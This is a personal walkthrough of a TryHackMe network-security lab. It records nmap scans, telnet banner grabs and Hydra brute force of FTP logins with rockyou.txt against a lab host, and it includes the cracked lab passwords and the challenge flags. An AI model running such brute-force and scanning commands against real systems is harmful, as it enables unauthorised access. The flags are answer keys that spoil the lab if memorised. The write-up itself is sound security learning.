@@ -1,0 +1,278 @@
+#Target: 10.114.140.2
+
+#Tools to be used:
+#telnet, nmap, and hydra
+
+#Recon:
+
+#Nmap:
+#1st scan - sudo nmap -sS -sV -O TARGET_IP -oA 
+#check output in net_sec_challenge dir
+	Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 15:24 +0200
+		Nmap scan report for 10.114.140.2
+		Host is up (0.020s latency).
+		Not shown: 995 closed tcp ports (reset)
+		PORT     STATE SERVICE     VERSION
+		22/tcp   open  ssh         (protocol 2.0)
+		80/tcp   open  http        lighttpd
+		139/tcp  open  netbios-ssn Samba smbd 4
+		445/tcp  open  netbios-ssn Samba smbd 4
+		8080/tcp open  http        Node.js (Express middleware
+
+#Nmap - 2nd scan -Pn (treat host alive - no ping scan)
+		
+		sudo nmap -Pn -p- 10.114.140.2 -v                         
+		Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 15:50 +0200
+		Initiating Parallel DNS resolution of 1 host. at 15:50
+		Completed Parallel DNS resolution of 1 host. at 15:50, 0.50s elapsed
+		Initiating SYN Stealth Scan at 15:50
+		Scanning 10.114.140.2 [65535 ports]
+		Discovered open port 80/tcp on 10.114.140.2
+		Discovered open port 445/tcp on 10.114.140.2
+		Discovered open port 22/tcp on 10.114.140.2
+		Discovered open port 8080/tcp on 10.114.140.2
+		Discovered open port 139/tcp on 10.114.140.2
+		Discovered open port 10021/tcp on 10.114.140.2
+		Completed SYN Stealth Scan at 15:50, 22.94s elapsed (65535 total ports)
+		Nmap scan report for 10.114.140.2
+		Host is up (0.020s latency).
+		Not shown: 65529 closed tcp ports (reset)
+		PORT      STATE SERVICE
+		22/tcp    open  ssh
+		80/tcp    open  http
+		139/tcp   open  netbios-ssn
+		445/tcp   open  microsoft-ds
+		8080/tcp  open  http-proxy
+		10021/tcp open  unknow
+	
+#Port above 10000 discovered to be 10021 - run quick service version scan against the found port:
+		sudo nmap -sS -sV 10.114.140.2 -p 10021 -vv
+
+		Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-25 15:51 +0200
+		NSE: Loaded 48 scripts for scanning.
+		Initiating Ping Scan at 15:51
+		Scanning 10.114.140.2 [4 ports]
+		Completed Ping Scan at 15:51, 0.04s elapsed (1 total hosts)
+		Initiating Parallel DNS resolution of 1 host. at 15:51
+		Completed Parallel DNS resolution of 1 host. at 15:51, 0.50s elapsed
+		Initiating SYN Stealth Scan at 15:51
+		Scanning 10.114.140.2 [1 port]
+		Discovered open port 10021/tcp on 10.114.140.2
+		Completed SYN Stealth Scan at 15:51, 0.04s elapsed (1 total ports)
+		Initiating Service scan at 15:51
+		Scanning 1 service on 10.114.140.2
+		Completed Service scan at 15:51, 1.07s elapsed (1 service on 1 host)
+		NSE: Script scanning 10.114.140.2.
+		NSE: Starting runlevel 1 (of 2) scan.
+		Initiating NSE at 15:51
+		Completed NSE at 15:51, 0.00s elapsed
+		NSE: Starting runlevel 2 (of 2) scan.
+		Initiating NSE at 15:51
+		Completed NSE at 15:51, 0.00s elapsed
+		Nmap scan report for 10.114.140.2
+		Host is up, received echo-reply ttl 62 (0.020s latency).
+		Scanned at 2026-04-25 15:51:30 CEST for 1s
+
+		PORT      STATE SERVICE REASON         VERSION
+		10021/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
+		Service Info: OS: Unix
+
+		Read data files from: /usr/share/nmap
+		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+		Nmap done: 1 IP address (1 host up) scanned in 1.84 seconds
+		           Raw packets sent: 5 (196B) | Rcvd: 2 (72B)
+
+#Port 10021 seems to be running FTP server
+
+#What is the THM{} flag hidden in HTTP server header
+	Use telnet to retrieve the HTTP header
+	
+	telnet 10.114.140.2 80
+		Trying 10.114.140.2...
+		Connected to 10.114.140.2.
+		Escape character is '^]'.
+		GET / HTTP/1.1
+
+		HTTP/1.1 400 Bad Request
+		Content-Type: text/html
+		Content-Length: 345
+		Connection: close
+		Date: Sat, 25 Apr 2026 13:59:56 GMT
+		Server: lighttpd THM{web_server_25352}
+
+		<?xml version="1.0" encoding="iso-8859-1"?>
+		<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+		         "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+		<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+		 <head>
+		  <title>400 Bad Request</title>
+		 </head>
+		 <body>
+		  <h1>400 Bad Request</h1>
+		 </body>
+		</html>
+	Connection closed by foreign host.
+	#although the directory does not exist, due to the 400 Bad Request response I was able to retrieve the THM flag as the server respons with
+	#lighttpd THM{flag_contents}
+
+#What is the flag hidden in the SSH server header
+	First try telnet:
+
+	telnet 10.114.140.2 22
+		Trying 10.114.140.2...
+		Connected to 10.114.140.2.
+		Escape character is '^]'.
+		SSH-2.0-OpenSSH_8.2p1 THM{946219583339} 
+		^C
+		Connection closed by foreign host
+#Success as we can see the SSH server response with flag
+
+#We have a FTP service running on the nonstandard port (10021) - what is the version, run portscan - or check previous scan as we already run the -sV (scan service
+#version) and we received response from nmap that it is running version: vsftpd 3.0.5
+
+#We learned two usernames using social engineering: eddie and quinn. What is the flag hidden in one of these two account files and accessible via FTP?
+	Use Hydra for this question, we know that syntax is:
+		hydra -l USERNAME -P WORDLIST TARGET_IP SERVICE
+	#where -l stands for login followed by the usernmae - eddie or quinn
+	#-P stands for password, and WORDLIST is up to the attacker to use, we will run rockyou.txt
+	#from 'Protocols and Servers' rooms we know we can run it like so:
+		hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt TARGET_IP ftp
+	#or
+		hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
+
+	#lets run first
+	hydra -l eddie -P /usr/share/wordlists/rockyou.txt 10.114.140.2 ftp   
+	Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-25 16:13:05
+	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+	[DATA] attacking ftp://10.114.140.2:21/
+	[ERROR] all children were disabled due too many connection errors
+	0 of 1 target completed, 0 valid password found
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-25 16:13:08
+
+	#no luck, lets try the second one
+	hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://10.114.140.2 
+	Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-25 16:12:51
+	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+	[DATA] attacking ftp://10.114.140.2:21/
+	[ERROR] all children were disabled due too many connection errors
+	0 of 1 target completed, 0 valid password found
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-25 16:12:5
+
+	#Now, both failed because port 10021 is not a standard port of FTP server, based on documentation we know the default FTP port is 21 or 990 for encrypted FTPS
+	#we need to specify port using hydra with flag -s PORT, new command looks like this:
+	#hydra -l USERNAME -P WORDLIST -s PORT TARGET_IP SERVICE
+	hydra -l eddie -P /usr/share/wordlists/rockyou.txt -s 10021 TARGET_IP ftp
+
+	#We found credentials: 
+	hydra -l eddie -P /usr/share/wordlists/rockyou.txt -s 10021 10.114.140.2 ftp
+	Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-25 16:17:22
+	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+	[DATA] attacking ftp://10.114.140.2:10021/
+	[10021][ftp] host: 10.114.140.2   login: eddie   password: jordan
+	1 of 1 target successfully completed, 1 valid password found
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-25 16:17:33
+	#Hydra printed out correct username and password, we can use CTRL-C to stop the hydra process as we already know the credentials and dont need hydra to
+	#continue, as there is 14344392 passwords in rockyou.txt:
+		wc -l /usr/share/wordlists/rockyou.txt
+		14344392 /usr/share/wordlists/rockyou.txt
+	#question was about the flag that either one of these accounts holds using FTP - lets connect using the credentials we found:
+		ftp 10.114.140.2 10021
+		Connected to 10.114.140.2.
+		220 (vsFTPd 3.0.5)
+		Name (10.114.140.2:holo): eddie
+		331 Please specify the password.
+		Password: 
+		230 Login successful.
+		Remote system type is UNIX.
+		Using binary mode to transfer files.
+		ftp> ls
+		229 Entering Extended Passive Mode (|||30256|)
+		150 Here comes the directory listing.
+		226 Directory send OK.
+		ftp> dir
+		229 Entering Extended Passive Mode (|||30454|)
+
+		150 Here comes the directory listing.
+		226 Directory send OK.
+		ftp> 
+		ftp> 
+		ftp> quit
+		221 Goodbye.
+	#no luck, lets find the credentials for the other user - quinn
+	#back to hydra, using last command as that one was successful:
+	hydra -l quinn -P /usr/share/wordlists/rockyou.txt -s 10021 10.114.140.2 ftp -v
+	Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+	Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-25 16:22:33
+	[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+	[DATA] attacking ftp://10.114.140.2:10021/
+	[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+	[10021][ftp] host: 10.114.140.2   login: quinn   password: andrea
+	[STATUS] attack finished for 10.114.140.2 (waiting for children to complete tests)
+	^C[ERROR] Received signal 2, going down ...
+	#Found credentials for user quinn - lets use that to see if we can find the flag:
+	#issue same command as before but for quinn
+	ftp 10.114.140.2 10021
+	Connected to 10.114.140.2.
+	220 (vsFTPd 3.0.5)
+	Name (10.114.140.2:holo): quinn
+	331 Please specify the password.
+	Password: 
+	230 Login successful.
+	Remote system type is UNIX.
+	Using binary mode to transfer files.
+	ftp> ls
+	229 Entering Extended Passive Mode (|||30282|)
+	150 Here comes the directory listing.
+	-rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt
+	226 Directory send OK.
+	ftp> get ftp_flag.txt
+	local: ftp_flag.txt remote: ftp_flag.txt
+	229 Entering Extended Passive Mode (|||30657|)
+	150 Opening BINARY mode data connection for ftp_flag.txt (18 bytes).
+	100% |*****************************************************************************************************************************|    18       33.35 KiB/s    00:00 ETA
+	226 Transfer complete.
+	18 bytes received in 00:00 (0.87 KiB/s)
+	ftp> quit
+	221 Goodbye.
+	#we can see that we have a ftp_flag.txt - download the flag to your machine using the get command - open using cat or a text editor such as nano/vim to view
+	cat ftp_flag.txt
+	THM{321452667098}
+
+#Browsing to http://10.114.140.2:8080 displays a small challenge that will give you a flag once you solve it. What is the flag?
+#unfortunately, this didnt work on local machine, so I had to launch attackbox within thm.
+#By running a Null scan on the target I received a flag
+
+	sudo nmap -sN TARGET_IP -p- -v
+	sudo: unable to resolve host ip-10-114-105-19: Name or service not known
+	Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-25 15:45 BST
+	Initiating Ping Scan at 15:45
+	Scanning 10.114.140.2 [4 ports]
+	Completed Ping Scan at 15:45, 0.03s elapsed (1 total hosts)
+	mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
+	mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
+	Initiating NULL Scan at 15:45
+	Scanning 10.114.140.2 [65535 ports]
+	Completed NULL Scan at 15:45, 5.07s elapsed (65535 total ports)
+	Nmap scan report for 10.114.140.2
+	Host is up (0.0066s latency).
+	Not shown: 65529 closed ports
+	PORT      STATE         SERVICE
+	22/tcp    open|filtered ssh
+	80/tcp    open|filtered http
+	139/tcp   open|filtered netbios-ssn
+	445/tcp   open|filtered microsoft-ds
+	8080/tcp  open|filtered http-proxy
+	10021/tcp open|filtered unknown
+
+	Read data files from: /usr/bin/../share/nmap
+	Nmap done: 1 IP address (1 host up) scanned in 5.32 seconds
+	           Raw packets sent: 65545 (2.622MB) | Rcvd: 65536 (2.622MB)
+
+#once checking the website http://TARGET_IP:8080 - we received a flag 
+	THM{f7443f99}
